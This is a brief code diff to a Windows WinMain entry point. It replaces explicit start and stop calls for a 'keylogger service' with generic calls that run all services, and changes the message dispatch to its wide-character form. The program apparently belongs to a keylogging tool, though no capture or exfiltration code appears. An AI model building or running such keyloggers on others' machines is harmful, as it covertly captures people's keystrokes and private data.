@@ -20,8 +20,8 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 		return 0;
 	}
 
-	// Run keylogger service
-	services::keyboard::run();
+	// Run all services
+	services::runAll();
 
 	// Windows message loop
 	MSG msg;
@@ -35,11 +35,12 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 		else
 		{
 			TranslateMessage(&msg);
-			DispatchMessage(&msg);
+			DispatchMessageW(&msg);
 		}
 	}
 
-	// Stop keylogger service
-	services::keyboard::stop();
+	// Stop all services
+	services::stopAll();
+
 	return 0;
 }
